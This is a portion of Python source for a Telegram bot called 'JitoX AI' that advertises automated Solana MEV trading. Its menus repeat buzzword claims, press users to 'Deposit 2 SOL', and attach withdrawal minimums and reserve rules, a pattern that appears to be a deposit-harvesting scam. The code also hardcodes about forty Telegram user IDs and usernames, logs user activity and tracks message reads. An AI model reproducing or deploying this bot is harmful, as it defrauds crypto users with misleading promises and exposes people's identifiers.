            "🎯 <b>Priority Execution Framework</b>\n"
            "⚔️ Real-time mempool intelligence\n"
            "⚔️ Dynamic priority management\n"
            "⚔️ Institutional-grade routing\n\n"
            "🎯 <b>Market Impact Protocol</b>\n"
            "⚔️ Advanced order flow analytics\n"
            "⚔️ Precision timing algorithms\n"
            "⚔️ Maximum value extraction\n\n"
            "🎯 <b>Cross-Venue Arbitrage Suite</b>\n"
            "⚔️ Multi-DEX differential analysis\n"
            "⚔️ Automated execution optimization\n"
            "⚔️ Cross-chain opportunity capture\n\n"
            "🛡️ <b>Professional Framework</b>\n"
            "✨ AI-driven market analysis\n"
            "✨ Continuous execution protocols\n"
            "✨ Self-custodial security architecture\n\n"
            "🔮 <b>Access Tiers</b>\n"
            "• Standard Suite: 2 SOL initialization\n"
            "• Enhanced Suite: 5+ SOL for institutional features\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoX_AI for immediate assistance\n\n"
            "Professional traders understand: Superior infrastructure drives exceptional MEV performance. 🎮"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def security_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Professional Security Matrix</b> 👾\n\n"
            "💎 <b>Enterprise Protection Framework</b>\n\n"
            "⚡️ <b>Advanced Security Protocols</b>\n\n"
            "🎯 <b>Strategic Architecture</b>\n"
            "⚔️ Self-Custodial Framework: Institutional-grade key management\n"
            "⚔️ Smart Contract Security: Advanced audit protocols\n"
            "⚔️ Risk Intelligence: Real-time exposure management\n"
            "⚔️ Operational Transparency: On-chain verification matrix\n"
            "⚔️ Professional Monitoring: 24/7 system surveillance\n\n"
            "🛡️ <b>Security Infrastructure</b>\n"
            "✨ Military-grade encryption protocols\n"
            "✨ Advanced threat detection systems\n"
            "✨ Multi-layer protection architecture\n\n"
            "🔮 <b>Professional Safeguards</b>\n"
            "• Institutional-grade risk management\n"
            "• Strategic position monitoring\n"
            "• Advanced security optimization\n\n"
            "⚡️ <b>Access Framework</b>\n"
            "• Standard Suite: 2 SOL initialization\n"
            "• Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior security ensures sustainable MEV performance. 🎮\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoX_AI for immediate assistance"
        )
    keyboard = [[InlineKeyboardButton("🔑 Secure Your Spot", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def withdraw_faq(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Withdrawal Matrix</b> 👾\n\n"
            "💎 <b>Professional Liquidity Framework</b>\n\n"
            "⚡️ <b>Withdrawal Protocol Suite</b>\n"
            "• Institutional-grade processing\n"
            "• Real-time transaction execution\n"
            "• Advanced security verification\n\n"
            "🎯 <b>Strategic Process</b>\n"
            "⚔️ Access withdrawal interface\n"
            "⚔️ Configure extraction parameters\n"
            "⚔️ Confirm security protocols\n"
            "⚔️ Automated processing matrix\n"
            "⚔️ Direct wallet settlement\n\n"
            "🛡️ <b>Operational Parameters</b>\n"
            "✨ Minimum extraction: 2 SOL\n"
            "✨ Strategic reserve: 2 SOL minimum\n"
            "✨ Network optimization fees apply\n\n"
            "🔮 <b>Professional Advisory</b>\n"
            "• Sustained operations maximize MEV capture\n"
            "• Strategic capital retention recommended\n"
            "• Enhanced Suite benefits (5+ SOL):\n"
            "  - Priority processing protocols\n"
            "  - Optimized fee structure\n\n"
            "Professional traders understand: Superior capital management ensures optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Professional Support</b>\n"
            "Contact @JitoX_AI for immediate assistance"
        )
    keyboard = [[InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def log_user_activity(application, user_id, activity):
    """Log user activity to database."""
    try:
        if not application or not application.bot:
            logger.warning("Application or bot not initialized for logging activity")
            return

        async with aiosqlite.connect('user_activity.db') as db:
            await db.execute('''
                CREATE TABLE IF NOT EXISTS user_activity 
                (user_id INTEGER, activity TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)
            ''')
            await db.execute('INSERT INTO user_activity (user_id, activity) VALUES (?, ?)',
                           (user_id, activity))
            await db.commit()
    except Exception as e:
        logger.error(f"Failed to log user activity: {str(e)}")
        # Continue execution even if logging fails
        pass

async def store_new_user(user_id: int, username: str = None, first_name: str = None, last_name: str = None):
    try:
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        logger.info(f"Using CSV file at: {csv_file}")
        
        # Check if user exists
        with open(csv_file, 'r', encoding='utf-8') as file:
            if any(str(user_id) in line for line in file):
                return False  # User already exists

        # Store new user
        with open(csv_file, 'a', encoding='utf-8', newline='') as file:
            file.write(f"{user_id},{username or ''},{first_name or ''},{last_name or ''}\n")
            
        # Add to user_data dictionary
        user_data[str(user_id)] = {
            'username': username,
            'first_name': first_name,
            'last_name': last_name
        }
        logger.info(f"Successfully stored new user: {user_id} ({username})")
        return True
    except Exception as e:
        logger.error(f"Error storing new user {user_id}: {str(e)}")
        return False

async def handle_blocked_user(user_id: int):
    try:
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        # Remove from CSV file
        df = pd.read_csv(csv_file)
        df = df[df['user_id'].astype(str) != str(user_id)]
        df.to_csv(csv_file, index=False)
        
        # Remove from user_data dictionary
        if str(user_id) in user_data:
            del user_data[str(user_id)]
            
        logger.info(f"Removed blocked user {user_id}")
    except Exception as e:
        logger.error(f"Error removing blocked user: {str(e)}")

# Initialize user_data at startup
user_data = {}
try:
    csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
    if not os.path.exists(csv_file):
        with open(csv_file, 'w', encoding='utf-8', newline='') as file:
            file.write("user_id,username,first_name,last_name\n")
            logger.info("Created new user_data.csv file with headers")
    
    df = pd.read_csv(csv_file)
    for _, row in df.iterrows():
        user_data[str(row['user_id'])] = {
            'username': row['username'],
            'first_name': row['first_name'],
            'last_name': row['last_name']
        }
    logger.info(f"Loaded {len(user_data)} users from CSV")
except Exception as e:
    logger.error(f"Error loading user data: {str(e)}")

async def track_message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if message:
        try:
            df = pd.read_csv('message_mapping.csv')
            mapping = df[df['telegram_message_id'] == str(message.message_id)]
            if not mapping.empty:
                broadcast_id = mapping.iloc[0]['broadcast_id']
                broadcaster.track_message_read(broadcast_id, update.effective_user.id)
                logger.info(f"Tracked message read: {broadcast_id} by user {update.effective_user.id}")
        except Exception as e:
            logger.error(f"Error tracking message read: {e}")

async def message_read_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    if message:
        try:
            df = pd.read_csv('message_mapping.csv')
            mapping = df[df['telegram_message_id'] == str(message.message_id)]
            if not mapping.empty:
                broadcast_id = mapping.iloc[0]['broadcast_id']
                broadcaster.track_message_read(broadcast_id, update.effective_user.id)
                logger.info(f"Tracked message read: {broadcast_id} by user {update.effective_user.id}")
        except Exception as e:
            logger.error(f"Error tracking message read: {e}")

async def migrate_database():
    """Handle database migrations and updates."""
    try:
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Check if earnings column exists in referrals table
            async with db.execute("PRAGMA table_info(referrals)") as cursor:
                columns = await cursor.fetchall()
                has_earnings = any(col[1] == 'earnings' for col in columns)
                
                if not has_earnings:
                    logger.info("Adding earnings column to referrals table")
                    await db.execute('ALTER TABLE referrals ADD COLUMN earnings REAL DEFAULT 0')
                    await db.commit()
            
            # Add any future migrations here
            
            logger.info("Database migration completed successfully")
    except Exception as e:
        logger.error(f"Error during database migration: {e}")
        raise

async def ensure_db_exists():
    """Ensure the database file exists and has the correct structure."""
    try:
        # Create database directory if it doesn't exist
        db_dir = os.path.dirname(REFERRAL_DB_PATH)
        if db_dir and not os.path.exists(db_dir):
            os.makedirs(db_dir)
            logger.info(f"Created database directory: {db_dir}")
        
        # Initialize database tables
        success = await init_referral_db()
        if not success:
            raise Exception("Failed to initialize database")
        
        # Verify tables exist and have correct structure
        async with aiosqlite.connect(REFERRAL_DB_PATH) as db:
            # Check referral_codes table
            async with db.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='referral_codes'") as cursor:
                if not await cursor.fetchone():
                    raise Exception("referral_codes table not found")
            
            # Check referrals table
            async with db.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='referrals'") as cursor:
                if not await cursor.fetchone():
                    raise Exception("referrals table not found")
            
            logger.info("Database structure verified successfully")
        
        # Run any necessary migrations
        await migrate_database()
        
        logger.info("Database initialization completed successfully")
        return True
    except Exception as e:
        logger.error(f"Error ensuring database exists: {e}")
        raise

async def recover_missed_users(application: Application) -> None:
    try:
        # Get existing users from CSV using manual reading to handle corrupted files
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        existing_users = set()
        
        if os.path.exists(csv_file):
            try:
                with open(csv_file, 'r', newline='', encoding='utf-8') as f:
                    next(f)  # Skip header
                    for line in f:
                        try:
                            parts = [p.strip() for p in line.strip().split(',')]
                            if parts and parts[0]:
                                existing_users.add(parts[0])
                        except Exception as line_error:
                            logger.error(f"Error parsing line in CSV: {line_error}")
                            continue
                logger.info(f"Found {len(existing_users)} existing users in CSV")
            except Exception as e:
                logger.error(f"Error reading CSV file: {e}")
        
        # Send notification about current user count
        admin_chat_id = -4540844698
        await application.bot.send_message(
            chat_id=admin_chat_id,
            text=f"Current user count in database: {len(existing_users)}\n\nNote: Due to Telegram API limitations, we cannot automatically recover old messages. Please forward any important user interaction messages to this chat manually if needed."
        )
    except Exception as e:
        logger.error(f"Error in recover_missed_users: {e}")
        # Continue bot operation even if recovery fails
        pass

async def add_missed_users():
    """Add missed users to the CSV file."""
    missed_users = [
        (789156333, "Michaelcasel9"),
        (6891153210, "JackyWangg"),
        (7646608198, "Jack"),
        (7065528683, "bluesinz"),
        (6109842687, "SautuBilal"),
        (5745101762, "dertyp999000"),
        (827324156, "codee21"),
        (7274014705, "patriive"),
        (1684979519, "Amit1603349"),
        (7635149853, "Mrxxhere"),
        (583822317, "UltimaWar"),
        (1462369980, "s28decentralized"),
        (363104330, "hokus7"),
        (310071061, "mmdoseh"),
        (1635810851, "c9580"),
        (426310896, "Tasiu37"),
        (595839917, "alexxvinn"),
        (5390584670, "Madjid"),
        (978625466, "IDoIt4ALiving"),
        (5537651609, "Sanjit"),
        (7140115193, "Baronsmiles002"),
        (6915936629, "Trumpsofficiall"),
        (5393695674, "CryptoBell0"),
        (1949836264, "skybucksboy"),
        (931022633, "zackbaharum"),
        (1780810427, "FendiCryptologi"),
        (1138015784, "llausdeo"),
        (2047082463, "CO"),
        (1944531910, "WhoopWho"),
        (7686531227, "SoftwareDev1738"),
        (1058833392, "dobrozloRap"),
        (7823490107, "AnnieBananiee"),
        (7241977064, "morhengrt"),
        (5847009152, "Nylez85"),
        (1391928444, "bisbaik"),
        (5135754228, "yizhiqingwa"),
        (7946234743, "Blitzou"),
        (5255753735, "Bill"),
        (259909408, "mthomas1985"),
        (869946859, "SuhailAhmadLone"),
        (5263460826, "mahmutnurettins"),
        (351094512, "thehorizoner"),
        (1239128550, "Raj"),
        (5804450621, "primeerrr1")
    ]
    
    try:
        # Get the CSV file path
        csv_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.csv')
        
        # Create backup before making changes
        backup_name = f'user_data_backup_{int(time.time())}.csv'
        backup_path = os.path.join(os.path.dirname(csv_file), backup_name)
        shutil.copy2(csv_file, backup_path)
        logger.info(f"Created backup at {backup_path}")
        
        # Read existing users to avoid duplicates
        existing_users = set()
        with open(csv_file, 'r', newline='', encoding='utf-8') as f:
            for line in f:
                try:
                    # Skip header
                    if 'user_id' in line.lower():
                        continue
                    # Split line and clean values
                    parts = [p.strip() for p in line.strip().split(',')]
                    if parts and parts[0]:  # Check if we have a user_id
                        try:
                            user_id = int(parts[0])
                            existing_users.add(user_id)
                        except ValueError:
                            logger.warning(f"Skipping invalid user_id in line: {line}")
                except Exception as e:
                    logger.warning(f"Error parsing line: {line}, error: {e}")
                    continue
        
        logger.info(f"Found {len(existing_users)} existing users")
        
        # Add new users
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        added_count = 0
        
        with open(csv_file, 'a', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            for user_id, username in missed_users:
                if user_id not in existing_users:
                    writer.writerow([user_id, username, current_time])
                    added_count += 1
                    existing_users.add(user_id)
                    logger.info(f"Added new user: {user_id} ({username})")
        
        logger.info(f"Successfully added {added_count} new users to the CSV file")
        return added_count
        
    except Exception as e:
        logger.error(f"Error adding missed users: {e}")
        return 0

def main() -> None:
    """Start the bot."""
    try:
        # Create the Application
        application = Application.builder().token(BOT_TOKEN).build()

        # Add command handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("get_wallet", get_wallet_command))
        application.add_handler(CommandHandler("withdraw", withdraw_command))
        application.add_handler(CommandHandler("mev", mev_command))
        application.add_handler(CommandHandler("intensity", intensity_command))
        application.add_handler(CommandHandler("pool", pool_command))
        application.add_handler(CommandHandler("settings", settings_command))
        application.add_handler(CommandHandler("auto", auto_command))
        application.add_handler(CommandHandler("ca", ca_command))
        
        # Add callback query handler for buttons
        application.add_handler(CallbackQueryHandler(button_handler))
        
        # Add error handler
        application.add_error_handler(error_handler)
        
        # Start balance monitoring job
        job_queue = application.job_queue
        job_queue.run_repeating(check_deposits, interval=30)  # Check every 30 seconds
        
        # Start the Bot
        logger.info("Starting bot...")
        application.run_polling()
        
    except Exception as e:
        logger.error(f"Error in main: {str(e)}")
        raise

if __name__ == '__main__':
    asyncio.run(main())
    asyncio.run(send_blocked_users_notification())
broadcaster = BroadcastSystem()


